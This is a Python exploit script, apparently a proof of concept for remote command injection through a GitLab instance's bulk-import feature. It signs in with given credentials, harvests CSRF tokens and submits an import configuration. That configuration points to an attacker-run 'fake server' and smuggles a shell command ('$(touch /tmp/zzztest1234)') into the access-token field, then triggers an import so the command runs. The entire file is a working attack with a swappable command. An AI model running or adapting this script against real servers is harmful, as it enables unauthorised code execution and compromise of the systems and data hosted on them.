
import requests
import random
import string
import sys


def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

TARGET = 'http://192.168.86.37'
USER = 'testa01'
PASSWORD = ''
PROXY = {}
FAKE_SERVER = ""
CMD = '$(touch /tmp/zzztest1234)'
session = requests.session()

burp0_url = TARGET + "/users/sign_in"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0", "Referer": TARGET + "/-/profile/password/new", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
ct = session.get(burp0_url, headers=burp0_headers, proxies=PROXY)

csrf_token = ct.content.split('csrf-token" content="')[1].split('"')[0]


burp0_url = TARGET + "/users/sign_in"

burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": TARGET, "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": TARGET + "/users/sign_in", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
burp0_data = {"authenticity_token": csrf_token, "user[login]": USER, "user[password]": PASSWORD, "user[remember_me]": "1"}

ct = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=PROXY, allow_redirects=False)

if ct.status_code != 302:
	print("Wrong cred")
	exit()




burp0_url = TARGET + "/groups/new"

burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": TARGET, "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

ct = session.get(burp0_url, headers=burp0_headers, proxies=PROXY).content
csrf_token = ct.split('csrf-token" content="')[1].split('"')[0]


burp0_url = TARGET + "/import/bulk_imports/configure"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": TARGET, "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": TARGET + "/groups/new", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
burp0_data = {"authenticity_token": csrf_token, "bulk_import_gitlab_url": FAKE_SERVER, "bulk_import_gitlab_access_token": CMD}

session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=PROXY)



burp0_url = TARGET + "/import/bulk_imports.json"

burp0_headers = {"Accept": "application/json, text/plain, */*", "X-CSRF-Token": csrf_token, "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36", "Content-Type": "application/json", "Origin": TARGET, "Referer": TARGET + "/import/bulk_imports/status", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

burp0_json={"bulk_import": [{"destination_name": id_generator(6), "destination_namespace": USER, "source_full_path": "daphuc/project4", "source_type": "project_entity"}]}

session.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=PROXY)